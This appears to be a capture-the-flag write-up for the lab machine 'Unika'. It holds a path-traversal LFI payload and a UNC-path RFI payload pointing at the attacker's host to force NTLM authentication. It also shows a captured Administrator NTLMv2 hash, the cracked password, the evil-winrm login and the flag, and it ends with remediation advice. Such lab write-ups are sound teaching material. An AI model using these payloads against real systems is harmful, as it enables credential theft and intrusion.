# 🎯 Unika.htb - LFI/RFI to NTLM Hash Capture → WinRM Shell

**Difficulty:** Easy  
**Target:** unika.htb  
**Flag:** `ea81b7afddd03efaa0945333ed147fac`

---

## 📋 Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Vulnerability Discovery - LFI](#vulnerability-discovery---lfi)
3. [Exploitation - RFI to NTLM Hash Capture](#exploitation---rfi-to-ntlm-hash-capture)
4. [Password Cracking](#password-cracking)
5. [Privilege Escalation via WinRM](#privilege-escalation-via-winrm)
6. [Flag Capture](#flag-capture)
7. [Lessons Learned](#lessons-learned)

---

## 🔍 Reconnaissance

### Port Scanning

```bash
nmap -sC -sV -p- unika.htb
```

**Key Findings:**
- **Port 80** - HTTP Web Server
- **Port 5985** - WinRM (Windows Remote Management)

---

## 🐛 Vulnerability Discovery - LFI

### Testing for Local File Inclusion

Navigating to `http://unika.htb`, I noticed a `page` parameter in the URL:

```
http://unika.htb/index.php?page=somepage.html
```

### LFI Test Payload

I tested for **Local File Inclusion** using directory traversal:

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

**Result:** ✅ **SUCCESS!** The server returned the contents of the `hosts` file, confirming **LFI vulnerability**.

---

## 💥 Exploitation - RFI to NTLM Hash Capture

### Attack Vector: Forced Authentication via RFI

Since the application is vulnerable to file inclusion, I attempted **Remote File Inclusion (RFI)** using a **UNC path** to force the server to authenticate to my machine.

### Step 1: Start Responder

On my AttackBox (IP: `10.10.15.2`):

```bash
sudo responder -I tun0 -wv
```

This starts an SMB listener to capture NTLM authentication attempts.

### Step 2: Trigger RFI with UNC Path

I crafted the following payload:

```
http://unika.htb/index.php?page=//10.10.15.2/somefile
```

**What happens:**
- The Windows server tries to access `\\10.10.15.2\somefile`
- Windows automatically sends **NTLM credentials** for authentication
- Responder captures the hash

### Step 3: Capture NTLM Hash

**Responder Output:**

```
[SMB] NTLMv2-SSP Client   : unika.htb
[SMB] NTLMv2-SSP Username : Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:cd5a94c68f7f95c8:AF696675237165D762753798D19D90B0:010100000000000080FC1A89669FDC01F270D033E890446B0000000002000800510036005000530001001E00570049004E002D005300420046004B00540035003600490043003100520004003400570049004E002D005300420046004B0054003500360049004300310052002E0051003600500053002E004C004F00430041004C000300140051003600500053002E004C004F00430041004C000500140051003600500053002E004C004F00430041004C000700080080FC1A89669FDC0106000400020000000800300030000000000000000100000000200000A35D963B16354A83BF7EB667B1EF837ECA5F129CB32B2A88274BAC1153C82D810A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310035002E0032000000000000000000
```

**Success!** ✅ Captured **Administrator's NTLMv2 hash**.

---

## 🔓 Password Cracking

### Saving the Hash

```bash
echo 'Administrator::RESPONDER:cd5a94c68f7f95c8:AF696675237165D762753798D19D90B0:010100000000000080FC1A89669FDC01F270D033E890446B0000000002000800510036005000530001001E00570049004E002D005300420046004B00540035003600490043003100520004003400570049004E002D005300420046004B0054003500360049004300310052002E0051003600500053002E004C004F00430041004C000300140051003600500053002E004C004F00430041004C000500140051003600500053002E004C004F00430041004C000700080080FC1A89669FDC0106000400020000000800300030000000000000000100000000200000A35D963B16354A83BF7EB667B1EF837ECA5F129CB32B2A88274BAC1153C82D810A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310035002E0032000000000000000000' > hash.txt
```

### Cracking with John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Output:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)
1g 0:00:00:03 DONE (2024-XX-XX XX:XX) 0.3003g/s 1234Kp/s 1234Kc/s 1234KC/s..badminton..
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

**Cracked Password:** `badminton` 🎾

---

## 🚀 Privilege Escalation via WinRM

### Port 5985 - WinRM

From earlier reconnaissance, I remembered **port 5985** was open, which is used for **Windows Remote Management (WinRM)**.

### Credentials

- **Username:** `Administrator`
- **Password:** `badminton`

### Connecting with evil-winrm

```bash
evil-winrm -i unika.htb -u Administrator -p 'badminton'
```

**Output:**

```
Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Success!** ✅ We have a shell as **Administrator**.

---

## 🏁 Flag Capture

### Finding the Flag

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        XX/XX/XXXX   XX:XX XX             33 flag.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
ea81b7afddd03efaa0945333ed147fac
```

**Flag:** `ea81b7afddd03efaa0945333ed147fac` 🚩

---

## 📚 Lessons Learned

### Key Takeaways

1. **LFI → RFI Escalation**
   - LFI can often be escalated to RFI
   - UNC paths (`//IP/share`) force Windows authentication

2. **NTLM Hash Capture**
   - Responder is powerful for capturing NTLM hashes
   - Windows automatically sends credentials when accessing UNC paths

3. **Password Cracking**
   - Weak passwords like `badminton` are easily cracked
   - Always try common wordlists (rockyou.txt)

4. **WinRM Exploitation**
   - Port 5985 = easy shell if you have credentials
   - evil-winrm is the perfect tool for this

### Attack Chain Summary

```
LFI Discovery → RFI with UNC Path → NTLM Hash Capture → 
Password Cracking → WinRM Access → Administrator Shell → Flag
```

---

## 🛡️ Remediation

**For Developers:**
1. **Input Validation:** Sanitize all user input, especially file paths
2. **Whitelist Approach:** Only allow specific files to be included
3. **Disable Remote Includes:** Set `allow_url_include = Off` in php.ini
4. **Strong Passwords:** Enforce complex password policies
5. **Disable WinRM:** If not needed, disable WinRM on public-facing servers

---

## 🔗 References

- [OWASP - File Inclusion Vulnerabilities](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [Responder GitHub](https://github.com/lgandx/Responder)
- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)

---

**PWN3D!** 🎉